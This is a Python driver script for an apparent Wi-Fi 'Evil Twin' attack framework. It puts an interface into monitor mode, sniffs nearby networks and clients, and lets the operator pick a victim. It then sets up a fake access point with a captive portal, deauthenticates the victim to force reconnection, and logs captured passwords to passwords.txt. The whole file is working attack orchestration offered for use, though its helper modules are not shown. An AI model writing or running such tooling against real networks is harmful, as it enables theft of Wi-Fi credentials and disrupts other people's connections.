#!/usr/bin/env python3

import subprocess
import sys
import time
import threading
import evil_twin_framework.network as network
import evil_twin_framework.data as data
import evil_twin_framework.dauth as dauth
import evil_twin_framework.bash_captive as captive

ONE_MINUTE_SCAN = 60

def main():
    # Select interface
    iface = network.select_interface()
    
    # Set up monitor mode
    command = ['sudo', 'bash', './set_up_monitor.sh', iface]
    result = subprocess.run(command, check=True)
    print(f"Set up Monitor Mode for {iface}. Starting continuous sniffing... (data collection runs in background)")
    
    # Start sniffing in background thread
    sniff_thread = threading.Thread(target=network.start_sniff, args=(iface,), daemon=True)
    sniff_thread.start()

    # Initial sniffing warm-up
    warmup = ONE_MINUTE_SCAN
    print(f"Gathering initial data...")
    time.sleep(warmup)

    try:
        while True:
            # Note: sniffing continues while in this menu
            networks = network.get_networks()
            clients = network.get_clients()
            
            data.display_networks(networks, clients)
            choice = input("Enter network index to inspect, 'r' to refresh, 'q' to quit: ").strip().lower()
            
            if choice == 'q':
                break
                
            if choice == 'r':
                refresh = ONE_MINUTE_SCAN
                print(f"Refreshing...")
                time.sleep(refresh)
                continue
                
            if choice.isdigit() and int(choice) < len(networks):
                idx = int(choice)
                target_bssid, info = network.get_network_by_index(idx)
                
                if target_bssid:
                    data.display_selected_ap(info, target_bssid)

                    # Client menu
                    while True:
                        # Still gathering data in background
                        data.display_clients(target_bssid, clients)
                        sub = input("Select client index, 'b' to go back, 'q' to quit: ").strip().lower()
                        
                        if sub == 'q':
                            network.stop_sniffing()
                            if sniff_thread.is_alive():
                                sniff_thread.join(timeout=2)
                            sys.exit(0)
                            
                        if sub == 'b':
                            break  # go back to network selection
                            
                        if sub.isdigit() and int(sub) < len(clients[target_bssid]):
                            client_mac, cinfo = network.get_client_by_index(target_bssid, int(sub))
                            
                            if client_mac:
                                data.display_final_selection(info, target_bssid, client_mac, cinfo)
                                
                                # Ask for attack type
                                attack_choice = input("\nPerform: 'd' for deauth only, 'e' for Evil Twin (deauth+portal), 'n' for none: ").strip().lower()
                                
                                if attack_choice == 'e':
                                    # Evil Twin attack flow
                                    print("\n[*] Preparing Evil Twin attack...")
                                    
                                    # Start Evil Twin (creates fake AP first)
                                    if captive.quick_start(
                                        "wlan0",
                                        target_bssid,
                                        info['SSID'],
                                        info['Channel'] or 6
                                    ):
                                        # Now deauth the client to force reconnection
                                        duration = 60
                                        print(f"\n[*] Deauthing client {client_mac} for {duration} seconds...")
                                        print("[*] Client should reconnect to our fake AP")
                                        
                                        dauth.start_attack(client_mac, target_bssid, iface, duration)
                                        
                                        # Wait for attack to complete
                                        while dauth.is_attack_running():
                                            time.sleep(0.5)
                                        
                                        print("\n[✓] Deauth completed!")
                                        print("[*] Captive portal is active and waiting for credentials...")
                                        print("[*] Check passwords.txt for captured credentials")
                                        
                                        # Keep portal running until user stops it
                                        input("\nPress Enter to stop Evil Twin and return to scanning...")
                                        
                                        # Stop Evil Twin
                                        captive.stop_evil_twin()
                                    else:
                                        print("[ERROR] Failed to setup Evil Twin")
                                
                                # After attack or if user chose 'n'
                                if attack_choice != 'q':
                                    next_action = input("\nWhat next? 'c' to continue scanning, 'q' to quit: ").strip().lower()
                                    if next_action == 'q':
                                        network.stop_sniffing()
                                        if sniff_thread.is_alive():
                                            sniff_thread.join(timeout=2)
                                        sys.exit(0)
                                # If 'c' or anything else, continue scanning
            else:
                print("Invalid choice.")
                
    except KeyboardInterrupt:
        pass
    finally:
        print("\nExiting...")
        
        # Cleanup any running attacks
        if dauth.is_attack_running():
            dauth.stop_attack()
        
        if captive.is_running():
            captive.stop_evil_twin()
        
        network.stop_sniffing()
        if sniff_thread.is_alive():
            sniff_thread.join(timeout=2)
        
        print("Cleanup complete.")

if __name__ == '__main__':
    main()
